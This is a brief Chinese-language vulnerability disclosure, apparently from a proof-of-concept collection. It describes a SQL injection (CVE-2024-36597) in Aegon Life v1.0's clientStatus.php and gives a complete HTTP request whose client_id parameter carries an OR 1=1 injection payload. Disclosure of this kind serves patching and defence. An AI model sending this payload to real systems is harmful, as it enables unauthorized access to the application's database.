## AEGON-LIFEv1.0存在SQL注入漏洞(CVE-2024-36597)

Aegon Life v1.0  clientStatus.php 中的 client_id 参数包含 SQL 注入漏洞。

## poc

```
GET /lims/clientStatus.php?client_id=1511986023%27%20OR%201=1%20--%20a HTTP/1.1
Host: localhost
sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=v6g7shnk1mm5vq6i63lklck78n
Connection: close
```



## 漏洞来源

- https://cxsecurity.com/issue/WLB-2024060033